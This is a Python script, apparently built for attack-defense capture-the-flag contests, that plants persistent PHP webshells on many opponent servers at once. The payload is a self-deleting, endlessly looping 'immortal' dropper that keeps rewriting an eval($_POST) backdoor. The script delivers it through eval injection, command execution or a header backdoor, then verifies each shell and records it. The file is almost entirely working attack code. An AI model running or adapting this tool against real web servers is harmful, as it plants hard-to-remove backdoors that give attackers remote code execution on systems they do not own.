#!/usr/bin/env python3
"""awd-shell: 从 awd.db 批量向存活目标种不死马，成功后登记到 shell 表。"""

import argparse
import base64
import json
import os
import sqlite3
import sys
import time
import urllib.parse
import urllib.request
import urllib.error
import concurrent.futures

from pathlib import Path

def find_awd_red_dir():
    if os.environ.get("AWD_RED_DIR"):
        return Path(os.environ["AWD_RED_DIR"]).resolve()
    bundle_root = Path(__file__).resolve().parent.parent.parent.parent
    if (bundle_root / "core" / "db.py").exists():
        return bundle_root
    cur = Path.cwd()
    for _ in range(4):
        if (cur / "core" / "db.py").exists():
            return cur
        cur = cur.parent
    return Path.home() / "awd-red"

AWD_RED_DIR = find_awd_red_dir()
AWD_RED_DB = str(AWD_RED_DIR / "data" / "platform.db")
LEGACY_DB = str(Path(__file__).resolve().parent.parent.parent / "awd-asset" / "data" / "awd.db")
DB_PATH = AWD_RED_DB if os.path.exists(AWD_RED_DB) else LEGACY_DB

# ─── 不死马 Payload ────────────────────────────────────────────
# dropper 文件：写入目标目录后 GET 触发，unlink 自己 + 死循环写 curl.php
DROPPER_PHP = """<?php
error_reporting(0);
unlink(__FILE__);
ignore_user_abort(true);
set_time_limit(0);
while (1) {
    file_put_contents(__DIR__ . '/curl.php', '<?php eval($_POST[1]);?>');
    sleep(5);
}
?>"""

DROPPER_B64 = base64.b64encode(DROPPER_PHP.encode()).decode()




# ─── 数据库操作 ────────────────────────────────────────────────

def load_vulns(db_path, app=None, vuln_type=None, file_filter=None):
    """从 vulns 表加载可利用漏洞，同文件去重。
    优先查询 eval/cmd/backdoor 类型，若为空则回退到所有 verified=1 的漏洞。"""
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    sql = "SELECT file, vuln_type, param FROM vulns WHERE verified=1 AND 1=1"
    params = []
    if app:
        sql += " AND app=?"
        params.append(app)
    if vuln_type:
        sql += " AND vuln_type=?"
        params.append(vuln_type)
    else:
        sql += " AND vuln_type IN ('eval','cmd','backdoor')"
    sql += " ORDER BY vuln_type, file"
    rows = conn.execute(sql, params).fetchall()
    
    # 如果未指定类型且结果为空，回退到查询所有漏洞 (verified=1 或 0)
    if not rows and not vuln_type:
        sql = "SELECT file, vuln_type, param FROM vulns WHERE 1=1"
        if app:
            sql += " AND app=?"
            rows = conn.execute(sql, [app]).fetchall()
        else:
            rows = conn.execute(sql).fetchall()
    
    conn.close()

    seen = set()
    vulns = []
    for r in rows:
        f = r["file"]
        if file_filter and file_filter not in f:
            continue
        if f in seen:
            continue
        seen.add(f)
        vulns.append({"file": f, "type": r["vuln_type"], "param": r["param"] or ""})
    return vulns


def load_targets(db_path, only_alive=True):
    # 优先支持从 AWD-Red 新平台 targets.txt 读取全量靶机列表
    targets_txt = os.environ.get("AWD_RED_TARGETS_TXT") or str(AWD_RED_DIR / "config" / "targets.txt")
    if os.path.exists(targets_txt):
        targets_list = []
        with open(targets_txt, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    # 展开或提取单 IP
                    targets_list.append({"ip": line, "target_url": f"http://{line}", "status": "alive"})
        if targets_list:
            return targets_list

    try:
        conn = sqlite3.connect(db_path)
        conn.row_factory = sqlite3.Row
        sql = "SELECT ip, target_url, status FROM targets WHERE role='opponent'"
        if only_alive:
            sql += " AND status='alive'"
        rows = conn.execute(sql).fetchall()
        conn.close()
        
        # 如果 alive 状态为空，回退到所有 opponent
        if not rows and only_alive:
            conn = sqlite3.connect(db_path)
            conn.row_factory = sqlite3.Row
            sql = "SELECT ip, target_url, status FROM targets WHERE role='opponent'"
            rows = conn.execute(sql).fetchall()
            conn.close()
        
        return [dict(r) for r in rows]
    except Exception:
        return []


def save_backdoor(db_path, app, target_ip, vuln, shell_url, flag_cmd=None):
    """种马成功后登记到 shell 表。flag_cmd 是获取 flag 的命令。"""
    conn = sqlite3.connect(db_path)
    conn.execute(
        "INSERT OR REPLACE INTO shell (app, file, password, method, shell_type, sample_payload, defense_action, flag_cmd) "
        "VALUES (?,?,?,?,?,?,?,?)",
        (app, f"{target_ip}/{vuln['file']}", vuln["param"] or "1", "POST", "eval",
         shell_url, "kill process + rm curl.php", flag_cmd),
    )
    conn.commit()
    conn.close()


# ─── HTTP 工具 ─────────────────────────────────────────────────

def http(method, url, data=None, headers=None, timeout=15):
    req = urllib.request.Request(url, method=method)
    req.add_header("User-Agent", "awd-shell/1.0")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    body = data.encode() if isinstance(data, str) else data
    if body is not None:
        req.data = body
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return -1, str(e)


# ─── 不死马部署 ────────────────────────────────────────────────

def deploy_immortal(target_url, vuln, db_path=None, app="seacms", save=True, flag_cmd=None):
    """向单个目标种不死马并登记。"""
    vt = vuln["type"]
    param = vuln["param"] or "c"
    rand = int(time.time() * 1000) % 1000000

    # 去掉 html/ 前缀 → 得到相对 web root 的路径
    rel_path = vuln["file"]
    if rel_path.startswith("html/"):
        rel_path = rel_path[len("html/"):]

    url = target_url.rstrip("/") + "/" + rel_path

    if vt == "eval":
        # 用 eval 写一个 base64 解码的 dropper 到同目录
        dropper_name = f".d{rand}.php"
        # eval 里直接 base64_decode 写文件
        code = f"file_put_contents(__DIR__.'/{dropper_name}',base64_decode('{DROPPER_B64}'));"
        body = f"{param}=" + urllib.parse.quote(code)
        status, resp = http("POST", url, data=body,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
        if status != 200:
            return {"ok": False, "error": f"write failed: HTTP {status}"}

        # GET 触发 dropper（会 unlink 自己 + 死循环写 curl.php）
        dropper_url = target_url.rstrip("/") + "/" + os.path.dirname(rel_path) + "/" + dropper_name
        try:
            req = urllib.request.Request(dropper_url)
            req.add_header("User-Agent", "awd-shell/1.0")
            urllib.request.urlopen(req, timeout=2)  # 超时正常，不死马继续跑
        except Exception:
            pass  # timeout/connection reset 都正常

    elif vt == "cmd":
        # 通过命令执行写入 /tmp 再后台运行
        dropper_cmd = (
            f"echo {DROPPER_B64} | base64 -d > /tmp/.d{rand}.php && "
            f"nohup php /tmp/.d{rand}.php > /dev/null 2>&1 &"
        )
        body = f"{param}=" + urllib.parse.quote(dropper_cmd)
        status, resp = http("POST", url, data=body,
                            headers={"Content-Type": "application/x-www-form-urlencoded"})
        if status != 200:
            return {"ok": False, "error": f"cmd failed: HTTP {status}"}
        # cmd 类型 dropper 在 /tmp，需要额外一步把 curl.php 拷到 web 目录
        # 但稳健版用 __DIR__ 所以 curl.php 会在 /tmp
        # 这里用原始版（写当前目录），让 system 的 cwd 是 web 根
        time.sleep(3)

    elif vt == "backdoor":
        # 通过 HTTP 头传 base64 编码的 dropper
        status, resp = http("POST", url, data="",
                            headers={param: DROPPER_B64,
                                     "Content-Type": "application/x-www-form-urlencoded"})
        if status != 200:
            return {"ok": False, "error": f"backdoor failed: HTTP {status}"}
        time.sleep(2)
    else:
        return {"ok": False, "error": f"unsupported: {vt}"}

    # 验证 curl.php
    shell_url = target_url.rstrip("/") + "/" + os.path.dirname(rel_path) + "/curl.php"
    vstatus, vbody = http("POST", shell_url,
                          data="1=" + urllib.parse.quote('echo "SHELL_OK";'),
                          headers={"Content-Type": "application/x-www-form-urlencoded"})
    verified = (vstatus == 200 and "SHELL_OK" in vbody)

    result = {"ok": True, "verified": verified, "shell_url": shell_url,
              "error": None if verified else f"HTTP {vstatus}"}

    # 登记到 shell 表
    if save and db_path and verified:
        target_ip = urllib.parse.urlparse(target_url).hostname
        save_backdoor(db_path, app, target_ip, vuln, shell_url, flag_cmd)

    return result


def deploy_batch(targets, vulns, db_path=DB_PATH, app="seacms", save=True, workers=4, dry_run=False, flag_cmd=None):
    if dry_run:
        results = []
        for t in targets:
            for v in vulns:
                rel = v["file"].removeprefix("html/")
                results.append({
                    "target": t["ip"], "file": rel, "type": v["type"], "param": v["param"],
                    "url": t["target_url"].rstrip("/") + "/" + rel,
                    "b64_len": len(DROPPER_B64),
                })
        return results

    def _one(args):
        t, v = args
        r = deploy_immortal(t["target_url"], v, db_path=db_path, app=app, save=save, flag_cmd=flag_cmd)
        r["target"] = t["ip"]
        r["file"] = v["file"].removeprefix("html/")
        r["type"] = v["type"]
        r["param"] = v["param"]
        return r

    jobs = [(t, v) for t in targets for v in vulns]
    if len(jobs) <= 3:
        return [_one(j) for j in jobs]
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        return list(ex.map(_one, jobs))


# ─── 主入口 ────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description="批量向存活目标种不死马并登记到 shell 表")
    p.add_argument("command", nargs="?", default="run", choices=["run"], help="执行命令 (默认 run)")
    p.add_argument("--db", default=DB_PATH)
    p.add_argument("--app", default=None, help="应用/题型名称 (默认全部)")
    p.add_argument("--type", default=None, choices=["eval", "cmd", "backdoor"])
    p.add_argument("--file", default=None, help="只种指定文件（子串匹配）")
    p.add_argument("--targets", nargs="*", default=None)
    p.add_argument("--workers", type=int, default=4)
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--no-save", action="store_true", help="不写入 shell 表")
    p.add_argument("--flag-cmd", default=None, help="flag 获取命令，存到 shell 表 flag_cmd 字段")
    p.add_argument("--json", action="store_true")
    args = p.parse_args()

    # 自动对齐 flag_cmd
    if not args.flag_cmd and os.path.isfile(args.db):
        try:
            conn = sqlite3.connect(args.db)
            cur = conn.cursor()
            cur.execute("SELECT target_url FROM targets WHERE role = 'server' ORDER BY id DESC LIMIT 1;")
            row = cur.fetchone()
            if not row:
                cur.execute("SELECT value FROM config WHERE key = 'flag_server';")
                row = cur.fetchone()
            conn.close()
            if row and row[0]:
                args.flag_cmd = f"curl -s '{row[0].strip()}'"
        except Exception:
            pass
    if not args.flag_cmd:
        args.flag_cmd = "curl -s 'http://10.0.0.1/get_flag'"

    vulns = load_vulns(args.db, app=args.app, vuln_type=args.type, file_filter=args.file)
    if not vulns:
        out = json.dumps({"error": "无匹配漏洞"}) if args.json else "无匹配漏洞"
        print(out)
        sys.exit(1)

    targets = load_targets(args.db)
    if args.targets:
        targets = [t for t in targets if t["ip"] in args.targets]
    if not targets:
        out = json.dumps({"error": "无存活目标"}) if args.json else "无存活目标"
        print(out)
        sys.exit(1)

    results = deploy_batch(targets, vulns, db_path=args.db, app=args.app,
                           save=not args.no_save, workers=args.workers, dry_run=args.dry_run,
                           flag_cmd=args.flag_cmd)

    success = sum(1 for r in results if r.get("ok"))
    verified = sum(1 for r in results if r.get("verified"))

    if args.json:
        print(json.dumps({
            "targets": [t["ip"] for t in targets],
            "vulns": [{"file": v["file"].removeprefix("html/"), "type": v["type"], "param": v["param"]} for v in vulns],
            "results": results,
            "summary": {"total": len(results), "success": success, "verified": verified, "failed": len(results) - success},
        }, ensure_ascii=False, indent=2))
    else:
        print(f"目标: {', '.join(t['ip'] for t in targets)}  ({len(targets)} 台存活)")
        print(f"漏洞: {len(vulns)} 个入口")
        for v in vulns:
            print(f"  {v['file'].removeprefix('html/')}  [{v['type']}]  param={v['param']}")
        print()
        for r in results:
            if r.get("dry_run"):
                print(f"  [dry] {r['target']}  {r['file']}  ({r['type']}/{r['param']})  →  {r['url']}")
            else:
                mark = "✓" if r.get("verified") else ("△" if r.get("ok") else "✗")
                shell = f"  shell={r['shell_url']}" if r.get("verified") else ""
                err = f"  ({r['error']})" if r.get("error") else ""
                print(f"  {mark}  {r['target']}  {r['file']}{shell}{err}")
        print(f"\n汇总: 成功 {success}/{len(results)}, 验证通过 {verified}, 已登记 {verified} 条到 shell 表")

    sys.exit(0 if success > 0 else 2)


if __name__ == "__main__":
    main()
